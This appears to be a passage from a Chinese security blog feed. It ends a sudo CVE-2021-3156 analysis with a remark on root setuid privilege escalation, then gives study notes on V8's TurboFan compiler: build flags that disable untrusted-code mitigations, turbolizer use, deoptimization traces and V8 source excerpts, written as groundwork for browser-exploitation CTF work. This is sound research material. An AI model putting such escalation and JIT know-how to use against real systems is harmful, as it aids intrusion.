<p>即，对于那些 owner 为 root 、执行权限为 <code>rws</code>的程序，若该程序内部执行了<code>setuid(0)</code>和<code>setgid(0)</code>，那么该程序就成功提权至 root。</p>
<p>这个样例同样适用于 sudo 程序。</p>
<h2 id="五、参考">五、参考</h2>
<ol>
<li>
<p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit" target="_blank" rel="noopener">CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)</a></p>
</li>
<li>
<p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt" target="_blank" rel="noopener">Qualys Security Advisory - Baron Samedit: Heap-based buffer overflow in Sudo (CVE-2021-3156)</a></p>
</li>
<li>
<p><a href="https://www.anquanke.com/post/id/229948" target="_blank" rel="noopener">CVE-2021-3156：Sudo 堆缓冲区溢出漏洞通告 - 安全客</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析 V8-turboFan</title>
    <url>/2021/01/v8-turboFan/</url>
    <content><![CDATA[<h2 id="一、前言">一、前言</h2>
<ul>
<li>
<p>v8 是一种 JS 引擎的实现，它由Google开发，使用C++编写。</p>
<p>v8 被设计用于提高网页浏览器内部 JavaScript 代码执行的性能。为了提高性能，v8 将会把 JS 代码转换为更高效的机器码，而非传统的使用解释器执行。因此 v8 引入了 <strong>JIT (Just-In-Time)</strong> 机制，该机制将会在运行时动态编译 JS 代码为机器码，以提高运行速度。</p>
</li>
<li>
<p>TurboFan是 v8 的优化编译器之一，它使用了 <a href="https://darksi.de/d.sea-of-nodes/" target="_blank" rel="noopener">sea of nodes</a> 这个编译器概念。</p>
<blockquote>
<p>sea of nodes 不是单纯的指某个图的结点，它是一种<strong>特殊中间表示</strong>的图。</p>
<p>它的表示形式与一般的CFG/DFG不同，其具体内容请查阅上面的连接。</p>
</blockquote>
<p>TurboFan的相关源码位于<code>v8/compiler</code>文件夹下。</p>
<a id="more"></a>
</li>
<li>
<p>这是笔者初次学习v8 turboFan所写下的笔记，内容包括但不限于turboFan运行参数的使用、部分<code>OptimizationPhases</code>的工作机理，以及拿来练手的<code>GoogleCTF 2018(Final) Just-In-Time</code>题题解。</p>
<p>该笔记<strong>基于 <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/" target="_blank" rel="noopener">Introduction to TurboFan</a> 并适当拓宽了一部分内容</strong>。如果在阅读文章时发现错误或者存在不足之处，欢迎各位师傅斧正！</p>
</li>
</ul>
<h2 id="二、环境搭建">二、环境搭建</h2>
<ul>
<li>
<p>这里的环境搭建较为简单，首先搭配一个 v8 环境（<strong>必须</strong>，没有 v8 环境要怎么研究 v8， 2333）。这里使用的版本号是<strong>7.0.276.3</strong>。</p>
<blockquote>
<p>如何搭配v8环境？请移步 <a href="https://kiprey.github.io/2020/11/fetch-chromium/">下拉&amp;编译 chromium&amp;v8 代码</a></p>
</blockquote>
<p>这里需要补充一下，v8 的 gn args中必须加一个<code>v8_untrusted_code_mitigations = false</code>的标志，即最后使用的gn args如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Set build arguments here. See `gn help buildargs`.</span></span><br><span class="line">is_debug = true</span><br><span class="line">target_cpu = <span class="string">"x64"</span></span><br><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_slow_dchecks = true</span><br><span class="line">v8_optimized_debug = false</span><br><span class="line"><span class="comment"># 加上这个</span></span><br><span class="line">v8_untrusted_code_mitigations = false</span><br></pre></td></tr></table></figure>
<p>具体原因将在下面讲解<code>CheckBounds</code>结点优化时提到。</p>
</li>
<li>
<p>然后安装一下 v8 的turbolizer，turbolizer将用于调试 v8 TurboFan中<code>sea of nodes</code>图的工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8/tools/turbolizer</span><br><span class="line"><span class="comment"># 获取依赖项</span></span><br><span class="line">npm i</span><br><span class="line"><span class="comment"># 构建</span></span><br><span class="line">npm run-script build</span><br><span class="line"><span class="comment"># 直接在turbolizer文件夹下启动静态http服务</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
<blockquote>
<p>构建turbolizer时可能会报一些TypeScript的语法错误ERROR，这些ERROR无伤大雅，不影响turbolizer的功能使用。</p>
</blockquote>
</li>
<li>
<p>turbolizer 的使用方式如下：</p>
<ul>
<li>
<p>首先编写一段测试函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 目标优化函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> values = [<span class="number">42</span>,<span class="number">1337</span>];</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="string">"foo"</span>)</span><br><span class="line">      x = <span class="number">5</span>;</span><br><span class="line">                         </span><br><span class="line">    <span class="keyword">let</span> y = x + <span class="number">2</span>;</span><br><span class="line">    y = y + <span class="number">1000</span>;</span><br><span class="line">    y = y * <span class="number">2</span>;</span><br><span class="line">    y = y &amp; <span class="number">10</span>;</span><br><span class="line">    y = y / <span class="number">3</span>;</span><br><span class="line">    y = y &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> values[y];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 必须！在优化该函数前必须先进行一次编译，以便于为该函数提供type feedback</span></span><br><span class="line">opt_me();</span><br><span class="line"><span class="comment">// 必须! 使用v8 natives-syntax来强制优化该函数</span></span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line"><span class="comment">// 必须！ 不调用目标函数则无法执行优化</span></span><br><span class="line">opt_me();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>一定要在执行<code>%OptimizeFunctionOnNextCall(opt_me)</code>之前调用一次目标函数，否则生成的graph将会因为没有type feedback而<strong>导致完全不一样的结果</strong>。</p>
<p>需要注意的是type feedback<strong>有点玄学</strong>，在执行<code>OptimizeFunctionOnNextCall</code>前，如果目标函数内部存在一些边界操作（例如多次使用超过<code>Number.MAX_SAFE_INTEGER</code>大小的整数等），那么调用目标函数的方式<strong>可能</strong>会影响turboFan的功能，包括但不限于传入参数的不同、调用目标函数次数的不同等等等等。</p>
<p>因此在执行<code>%OptimizeFunctionOnNextCall</code>前，目标函数的调用方式，必须自己把握，手动确认<strong>调用几次，传入什么参数</strong>会优化出特定的效果。</p>
</blockquote>
<p>若想优化一个函数，除了可以使用<code>%OptimizeFunctionOnNextCall</code>以外，还可以多次执行该函数（次数要大，建议上for循环）来触发优化。</p>
</li>
<li>
<p>然后使用 d8 执行，不过需要加上<code>--trace-turbo</code>参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  ../../v8/v8/out.gn/x64.debug/d8 test.js --allow-natives-syntax --trace-turbo   </span><br><span class="line">Concurrent recompilation has been disabled <span class="keyword">for</span> tracing.</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method opt_me using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method opt_me using Turbofan</span><br></pre></td></tr></table></figure>
<p>之后本地就会生成<code>turbo.cfg</code>和<code>turbo-xxx-xx.json</code>文件。</p>
</li>
<li>
<p>使用浏览器打开<code>127.0.0.1:8000</code>（注意之前在turbolizer文件夹下启动了http服务）</p>
<p>然后点击右上角的3号按钮，在文件选择窗口中选择刚刚生成的<code>turbo-xxx-xx.json</code>文件，之后就会显示以下信息：</p>
<p><img src="/2021/01/v8-turboFan/turbolizer.png" alt="img"></p>
<p>不过这里的结点只显示了控制结点，如果需要显示全部结点，则先点击一下上方的2号按钮，将结点全部展开，之后再点击1号按钮，重新排列：</p>
<p><img src="/2021/01/v8-turboFan/turbolizer1.png" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h2 id="三、turboFan的代码优化">三、turboFan的代码优化</h2>
<ul>
<li>
<p>我们可以使用 <code>--trace-opt</code>参数来追踪函数的优化信息。以下是函数<code>opt_me</code>被turboFan优化时所生成的信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ../../v8/v8/out.gn/x64.debug/d8 test.js --allow-natives-syntax --trace-opt </span><br><span class="line">[manually marking 0x0a7a24823759 &lt;JSFunction opt_me (sfi = 0xa7a24823591)&gt; <span class="keyword">for</span> non-concurrent optimization]</span><br><span class="line">[compiling method 0x0a7a24823759 &lt;JSFunction opt_me (sfi = 0xa7a24823591)&gt; using TurboFan]</span><br><span class="line">[optimizing 0x0a7a24823759 &lt;JSFunction opt_me (sfi = 0xa7a24823591)&gt; - took 53.965, 19.410, 0.667 ms]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>上面输出中的<code>manually marking</code>即我们在代码中手动设置的<code>%OptimizeFunctionOnNextCall</code>。</p>
</blockquote>
<p>我们可以使用 v8 本地语法来查看优化前和优化后的机器码（使用<code>%DisassembleFunction</code>本地语法）</p>
<blockquote>
<p>输出信息过长，这里只截取一部分输出。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ../../v8/v8/out.gn/x64.debug/d8 test.js --allow-natives-syntax  </span><br><span class="line"></span><br><span class="line">0x2b59fe964c1: [Code]</span><br><span class="line"> - map: 0x05116bd02ae9 &lt;Map&gt;</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = InterpreterEntryTrampoline</span><br><span class="line">compiler = unknown</span><br><span class="line">address = 0x2b59fe964c1</span><br><span class="line"></span><br><span class="line">Instructions (size = 995)</span><br><span class="line">0x2b59fe96500     0  488b5f27       REX.W movq rbx,[rdi+0x27]</span><br><span class="line">0x2b59fe96504     4  488b5b07       REX.W movq rbx,[rbx+0x7]</span><br><span class="line">0x2b59fe96508     8  488b4b0f       REX.W movq rcx,[rbx+0xf]</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">0x2b59ff49541: [Code]</span><br><span class="line"> - map: 0x05116bd02ae9 &lt;Map&gt;</span><br><span class="line">kind = OPTIMIZED_FUNCTION</span><br><span class="line">stack_slots = 5</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = 0x2b59ff49541</span><br><span class="line"></span><br><span class="line">Instructions (size = 212)</span><br><span class="line">0x2b59ff49580     0  488d1df9ffffff REX.W leaq rbx,[rip+0xfffffff9]</span><br><span class="line">0x2b59ff49587     7  483bd9         REX.W cmpq rbx,rcx</span><br><span class="line">0x2b59ff4958a     a  7418           jz 0x2b59ff495a4  &lt;+0x24&gt;</span><br><span class="line">0x2b59ff4958c     c  48ba000000003e000000 REX.W movq rdx,0x3e00000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到，所生成的代码长度从原先的995，优化为212，大幅度优化了代码。</p>
<blockquote>
<p>需要注意的是，即便不使用<code>%OptimizeFunctionOnNextCall</code>，将<code>opt_me</code>函数重复执行一定次数，一样可以触发TurboFan的优化。</p>
</blockquote>
</li>
<li>
<p>细心的小伙伴应该可以在上面环境搭建的图中看到<code>deoptimize</code>反优化。为什么需要反优化？这就涉及到turboFan的优化机制。以下面这个js代码为例（注意：没有使用<code>%OptimizeFunctionOnNextCall</code>）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Player</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wall</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = obj.x + <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="built_in">Math</span>.random();</span><br><span class="line">  x += <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> tmp + x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">  move(<span class="keyword">new</span> Player());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">move(<span class="keyword">new</span> Wall());</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">  move(<span class="keyword">new</span> Wall());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟踪一下该代码的opt以及deopt：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ../../v8/v8/out.gn/x64.debug/d8 test.js --allow-natives-syntax  --trace-opt --trace-deopt </span><br><span class="line">[marking 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; <span class="keyword">for</span> optimized recompilation, reason: small <span class="keyword">function</span>, ICs with typeinfo: 7/7 (100%), generic ICs: 0/7 (0%)]</span><br><span class="line">[compiling method 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; using TurboFan]</span><br><span class="line">[optimizing 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; - took 6.583, 2.385, 0.129 ms]</span><br><span class="line">[completed optimizing 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt;]</span><br><span class="line"><span class="comment"># 分割线---------------------------------------------------------------------</span></span><br><span class="line">[marking 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; <span class="keyword">for</span> optimized recompilation, reason: hot and stable, ICs with typeinfo: 7/13 (53%), generic ICs: 0/13 (0%)]</span><br><span class="line">[compiling method 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; using TurboFan OSR]</span><br><span class="line">[optimizing 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; - took 3.684, 7.337, 0.409 ms]</span><br><span class="line"><span class="comment"># 分割线---------------------------------------------------------------------</span></span><br><span class="line">[deoptimizing (DEOPT soft): begin 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; (opt <span class="comment">#1) @6, FP to SP delta: 104, caller sp: 0x7ffed15d2a08]</span></span><br><span class="line">            ;;; deoptimize at &lt;test.js:15:6&gt;, Insufficient <span class="built_in">type</span> feedback <span class="keyword">for</span> construct</span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">[deoptimizing (soft): end 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; @6 =&gt; node=154, pc=0x7f0d956522e0, <span class="built_in">caller</span> sp=0x7ffed15d2a08, took 0.496 ms]</span><br><span class="line">[deoptimizing (DEOPT eager): begin 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; (opt <span class="comment">#0) @1, FP to SP delta: 24, caller sp: 0x7ffed15d2990]</span></span><br><span class="line">            ;;; deoptimize at &lt;test.js:5:17&gt;, wrong map</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">[deoptimizing (eager): end 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; @1 =&gt; node=0, pc=0x7f0d956522e0, <span class="built_in">caller</span> sp=0x7ffed15d2990, took 0.355 ms]</span><br><span class="line"><span class="comment"># 分割线---------------------------------------------------------------------</span></span><br><span class="line">[marking 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; <span class="keyword">for</span> optimized recompilation, reason: small <span class="keyword">function</span>, ICs with typeinfo: 7/7 (100%), generic ICs: 0/7 (0%)]</span><br><span class="line">[compiling method 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; using TurboFan]</span><br><span class="line">[optimizing 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; - took 1.435, 2.427, 0.159 ms]</span><br><span class="line">[completed optimizing 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt;]</span><br><span class="line">[compiling method 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; using TurboFan OSR]</span><br><span class="line">[optimizing 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; - took 3.399, 6.299, 0.239 ms]</span><br></pre></td></tr></table></figure>
<ul>
<li>首先，<code>move</code>函数被标记为可优化的(optimized recompilation)，原因是该函数为small function。然后便开始重新编译以及优化。</li>
<li>之后，<code>move</code>函数再一次被标记为可优化的，原因是<code>hot and stable</code>。这是因为 v8 首先生成的是 <a href="https://v8.dev/docs/ignition" target="_blank" rel="noopener">ignition bytecode</a>。 如果某个函数被重复执行多次，那么TurboFan就会重新生成一些优化后的代码。</li>
</ul>
<blockquote>
<p>以下是获取优化理由的的v8代码。如果该JS函数可被优化，则将在外部的v8函数中，mark该JS函数为待优化的。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">OptimizationReason <span class="title">RuntimeProfiler::ShouldOptimize</span><span class="params">(JSFunction* function,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                   JavaScriptFrame* frame)</span> </span>&#123;</span><br><span class="line">  SharedFunctionInfo* shared = function-&gt;shared();</span><br><span class="line">  <span class="keyword">int</span> ticks = function-&gt;feedback_vector()-&gt;profiler_ticks();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shared-&gt;GetBytecodeArray()-&gt;length() &gt; kMaxBytecodeSizeForOpt) &#123;</span><br><span class="line">    <span class="keyword">return</span> OptimizationReason::kDoNotOptimize;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> ticks_for_optimization =</span><br><span class="line">      kProfilerTicksBeforeOptimization +</span><br><span class="line">      (shared-&gt;GetBytecodeArray()-&gt;length() / kBytecodeSizeAllowancePerTick);</span><br><span class="line">  <span class="comment">// 如果执行次数较多，则标记为HotAndStable</span></span><br><span class="line">  <span class="keyword">if</span> (ticks &gt;= ticks_for_optimization) &#123;</span><br><span class="line">    <span class="keyword">return</span> OptimizationReason::kHotAndStable;</span><br><span class="line">  <span class="comment">// 如果函数较小，则为 small function</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!any_ic_changed_ &amp;&amp; shared-&gt;GetBytecodeArray()-&gt;length() &lt;</span><br><span class="line">                                     kMaxBytecodeSizeForEarlyOpt) &#123;</span><br><span class="line">    <span class="comment">// If no IC was patched since the last tick and this function is very</span></span><br><span class="line">    <span class="comment">// small, optimistically optimize it now.</span></span><br><span class="line">    <span class="keyword">return</span> OptimizationReason::kSmallFunction;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FLAG_trace_opt_verbose) &#123;</span><br><span class="line">    PrintF(<span class="string">"[not yet optimizing "</span>);</span><br><span class="line">    function-&gt;PrintName();</span><br><span class="line">    PrintF(<span class="string">", not enough ticks: %d/%d and "</span>, ticks,</span><br><span class="line">           kProfilerTicksBeforeOptimization);</span><br><span class="line">    <span class="keyword">if</span> (any_ic_changed_) &#123;</span><br><span class="line">      PrintF(<span class="string">"ICs changed]\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      PrintF(<span class="string">" too large for small function optimization: %d/%d]\n"</span>,</span><br><span class="line">             shared-&gt;GetBytecodeArray()-&gt;length(), kMaxBytecodeSizeForEarlyOpt);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> OptimizationReason::kDoNotOptimize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>但接下来就开始<strong>deopt</strong> move函数了，原因是<code>Insufficient type feedback for construct</code>，目标代码是<code>move(new Wall())</code>中的<code>new Wall()</code>。</p>
<p>这是因为turboFan的代码优化<strong>基于推测</strong>，即<code>speculative optimizations</code>。当我们多次执行<code>move(new Player())</code>时，turboFan会猜测move函数的参数总是<code>Player</code>对象，因此将move函数优化为更适合<code>Player</code>对象执行的代码，这样使得<code>Player</code>对象使用move函数时速度将会很快。</p>
<p>这种猜想机制需要一种反馈来动态修改猜想，那么这种反馈就是 <a href="https://mrale.ph/blog/2015/01/11/whats-up-with-monomorphism.html" target="_blank" rel="noopener">type feedback</a>，Ignition instructions将利用 type feedback来帮助TurboFan的<code>speculative optimizations</code>。</p>
<blockquote>
<p>v8源码中，<code>JSFunction</code>类中存在一个类型为<code>FeedbackVector</code>的成员变量，该FeedbackVector将在JS函数被编译后启用。</p>
</blockquote>
<p>因此一旦传入的参数不再是<code>Player</code>类型，即刚刚所说的<code>Wall</code>类型，那么将会使得猜想不成立，因此立即反优化，即<strong>销毁一部分的ignition bytecode并重新生成</strong>。</p>
<p>需要注意的是，反优化机制(<strong>deoptimization</strong>)有着巨大的性能成本，应尽量避免反优化的产生。</p>
</li>
<li>
<p>下一个<code>deopt</code>的原因为<code>wrong map</code>。这里的<strong>map</strong>可以暂时理解为<strong>类型</strong>。与上一条deopt的原因类似，所生成的<code>move</code>优化函数只是针对于<code>Player</code>对象，因此一旦传入一个<code>Wall</code>对象，那么传入的类型就与函数中的类型不匹配，所以只能开始反优化。</p>
</li>
<li>
<p>如果我们在代码中来回使用<code>Player</code>对象和<code>Wall</code>对象，那么TurboFan也会综合考虑，并相应的再次优化代码。</p>
</li>
</ul>
</li>
</ul>
<h2 id="四、turboFan的执行流程">四、turboFan的执行流程</h2>
<ul>
<li>
<p>turboFan的代码优化有多条执行流，其中最常见到的是下面这条：<br>
<img src="/2021/01/v8-turboFan/createGraph-bt1.png" alt="img"></p>
</li>
<li>
<p>从<code>Runtime_CompileOptimized_Concurrent</code>函数开始，设置并行编译&amp;优化 特定的JS函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8\src\runtime\runtime-compiler.cc 46</span></span><br><span class="line">RUNTIME_FUNCTION(Runtime_CompileOptimized_Concurrent) &#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  DCHECK_EQ(<span class="number">1</span>, args.length());</span><br><span class="line">  CONVERT_ARG_HANDLE_CHECKED(JSFunction, function, <span class="number">0</span>);</span><br><span class="line">  <span class="function">StackLimitCheck <span class="title">check</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (check.JsHasOverflowed(kStackSpaceRequiredForCompilation * KB)) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;StackOverflow();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 设置并行模式，之后开始编译与优化</span></span><br><span class="line">  <span class="keyword">if</span> (!Compiler::CompileOptimized(function, ConcurrencyMode::kConcurrent)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ReadOnlyRoots(isolate).exception();</span><br><span class="line">  &#125;</span><br><span class="line">  DCHECK(function-&gt;is_compiled());</span><br><span class="line">  <span class="keyword">return</span> function-&gt;code();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>Compiler::CompileOptimized</code>函数中，继续执行<code>GetOptimizedCode</code>函数，并将可能生成的优化代码传递给<code>JSFunction</code>对象。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8\src\compiler.cc</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Compiler::CompileOptimized</span><span class="params">(Handle&lt;JSFunction&gt; function,</span></span></span><br><span class="line"><span class="function"><span class="params">                                ConcurrencyMode mode)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (function-&gt;IsOptimized()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  Isolate* isolate = function-&gt;GetIsolate();</span><br><span class="line">  DCHECK(AllowCompilation::IsAllowed(isolate));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Start a compilation.</span></span><br><span class="line">  Handle&lt;Code&gt; code;</span><br><span class="line">  <span class="keyword">if</span> (!GetOptimizedCode(function, mode).ToHandle(&amp;code)) &#123;</span><br><span class="line">    <span class="comment">// Optimization failed, get unoptimized code. Unoptimized code must exist</span></span><br><span class="line">    <span class="comment">// already if we are optimizing.</span></span><br><span class="line">    DCHECK(!isolate-&gt;has_pending_exception());</span><br><span class="line">    DCHECK(function-&gt;shared()-&gt;is_compiled());</span><br><span class="line">    DCHECK(function-&gt;shared()-&gt;IsInterpreted());</span><br><span class="line">    code = BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Install code on closure.</span></span><br><span class="line">  function-&gt;set_code(*code);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check postconditions on success.</span></span><br><span class="line">  DCHECK(!isolate-&gt;has_pending_exception());</span><br><span class="line">  DCHECK(function-&gt;shared()-&gt;is_compiled());</span><br><span class="line">  DCHECK(function-&gt;is_compiled());</span><br><span class="line">  DCHECK_IMPLIES(function-&gt;HasOptimizationMarker(),</span><br><span class="line">                 function-&gt;IsInOptimizationQueue());</span><br><span class="line">  DCHECK_IMPLIES(function-&gt;HasOptimizationMarker(),</span><br><span class="line">                 function-&gt;ChecksOptimizationMarker());</span><br><span class="line">  DCHECK_IMPLIES(function-&gt;IsInOptimizationQueue(),</span><br><span class="line">                 mode == ConcurrencyMode::kConcurrent);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>GetOptimizedCode</code>的函数代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8\src\compiler.cc</span></span><br><span class="line"><span class="function">MaybeHandle&lt;Code&gt; <span class="title">GetOptimizedCode</span><span class="params">(Handle&lt;JSFunction&gt; function,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ConcurrencyMode mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   BailoutId osr_offset = BailoutId::None(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                   JavaScriptFrame* osr_frame = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">  Isolate* isolate = function-&gt;GetIsolate();</span><br><span class="line">  <span class="function">Handle&lt;SharedFunctionInfo&gt; <span class="title">shared</span><span class="params">(function-&gt;shared(), isolate)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Make sure we clear the optimization marker on the function so that we</span></span><br><span class="line">  <span class="comment">// don't try to re-optimize.</span></span><br><span class="line">  <span class="keyword">if</span> (function-&gt;HasOptimizationMarker()) &#123;</span><br><span class="line">    function-&gt;ClearOptimizationMarker();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;debug()-&gt;needs_check_on_function_call()) &#123;</span><br><span class="line">    <span class="comment">// Do not optimize when debugger needs to hook into every call.</span></span><br><span class="line">    <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Handle&lt;Code&gt; cached_code;</span><br><span class="line">  <span class="keyword">if</span> (GetCodeFromOptimizedCodeCache(function, osr_offset)</span><br><span class="line">          .ToHandle(&amp;cached_code)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (FLAG_trace_opt) &#123;</span><br><span class="line">      PrintF(<span class="string">"[found optimized code for "</span>);</span><br><span class="line">      function-&gt;ShortPrint();</span><br><span class="line">      <span class="keyword">if</span> (!osr_offset.IsNone()) &#123;</span><br><span class="line">        PrintF(<span class="string">" at OSR AST id %d"</span>, osr_offset.ToInt());</span><br><span class="line">      &#125;</span><br><span class="line">      PrintF(<span class="string">"]\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cached_code;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reset profiler ticks, function is no longer considered hot.</span></span><br><span class="line">  DCHECK(shared-&gt;is_compiled());</span><br><span class="line">  function-&gt;feedback_vector()-&gt;set_profiler_ticks(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="function">VMState&lt;COMPILER&gt; <span class="title">state</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  DCHECK(!isolate-&gt;has_pending_exception());</span><br><span class="line">  <span class="function">PostponeInterruptsScope <span class="title">postpone</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="keyword">bool</span> has_script = shared-&gt;script()-&gt;IsScript();</span><br><span class="line">  <span class="comment">// BUG(5946): This DCHECK is necessary to make certain that we won't</span></span><br><span class="line">  <span class="comment">// tolerate the lack of a script without bytecode.</span></span><br><span class="line">  DCHECK_IMPLIES(!has_script, shared-&gt;HasBytecodeArray());</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;OptimizedCompilationJob&gt; <span class="title">job</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      compiler::Pipeline::NewCompilationJob(isolate, function, has_script))</span></span>;</span><br><span class="line">  OptimizedCompilationInfo* compilation_info = job-&gt;compilation_info();</span><br><span class="line"></span><br><span class="line">  compilation_info-&gt;SetOptimizingForOsr(osr_offset, osr_frame);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do not use TurboFan if we need to be able to set break points.</span></span><br><span class="line">  <span class="keyword">if</span> 